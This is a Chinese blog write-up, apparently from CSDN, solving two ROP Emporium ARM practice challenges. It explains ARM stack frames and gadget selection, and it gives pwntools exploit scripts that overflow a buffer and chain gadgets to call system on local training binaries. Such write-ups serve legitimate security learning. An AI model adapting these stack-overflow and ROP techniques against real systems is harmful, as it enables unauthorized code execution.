<font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个[网站](https://ropemporium.com/)有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font>

# <font face=汉仪唐美人>1. ret2win</font>
<font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用``qemu-arm xxx``有可能会报错：``/lib/ld-linux.so.3: No such file or directory``。解决方法：安装arm交叉编译包``apt install gcc-arm-linux-gnueabi``，找到交叉编译包的lib地址（一般都是``/usr/arm-linux-gnueabi``），在命令后添加``-L /usr/arm-linux-gnueabi``即可。</font>

![](https://img-blog.csdnimg.cn/72f8330410f2409099e3a2911a620c49.png)
<font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font>

<font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方``BL``指令调用``read``函数前，首先将第3个参数``nbytes``赋值给``R2``寄存器。在``pwnme``函数开头有一个``PUSH``指令，这里的``R11``可以看做是``rbp``，``LR``是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存``R11``的值作为栈帧的标记，``SP``下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font>

<font face=汉仪唐美人>下面看到``read``函数的调用部分。第二个参数``R1``的值为``R11-0x24``，由于``R11``在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font>

<font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复``SP``为``R11-4``，然后``R11``出栈，``PC``出栈。在正常情况下，这里的``R11``出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，``R11``就无效了。</font>

```python
from pwn import *
context.arch='arm'
context.log_level='debug'

io = process(['qemu-arm-static', '-L', '/usr/arm-linux-gnueabi/', './ret2win_armv5'])

io.sendlineafter(b'> ', cyclic(0x24) + p32(0x105ec))
io.interactive()
```

# <font face=汉仪唐美人>2. split</font>
![](https://img-blog.csdnimg.cn/4eb497d770a04a65bc7378c24aaaa801.png)
![](https://img-blog.csdnimg.cn/1c558b27837b49ca94e561b7cb4ff4d5.png)

<font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font>

<font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font>

![](https://img-blog.csdnimg.cn/30cf8aeff38a4fe995135615b75f0511.png)

<font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用``pop``指令的gadget中没有能够``pop r0``的，我们只能扩大范围进行查找：</font>

![在这里插入图片描述](https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png)

<font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的``pop {r3, pc}``连接起来，首先修改``r3``的值，再修改``r0``的值即可。于是我们的exp呼之欲出：</font>

```python
from pwn import *
context.arch='arm'
context.log_level='debug'

io = process(['qemu-arm-static', '-L', '/usr/arm-linux-gnueabi/', './split_armv5'])

popr3pc = 0x103a4
movr0r3_popfppc = 0x10558
shellstr = 0x2103c
callsystem = 0x105e0

io.sendlineafter(b'> ', cyclic(0x24) + p32(popr3pc) + p32(shellstr) + p32(movr0r3_popfppc) + p32(0) + p32(callsystem))
io.interactive()
```

<font face=汉仪唐美人>PS：本来想发三道题的，但是这周末比赛打的太累了，第三题就留到后面一篇文章发了，还请谅解。</font>
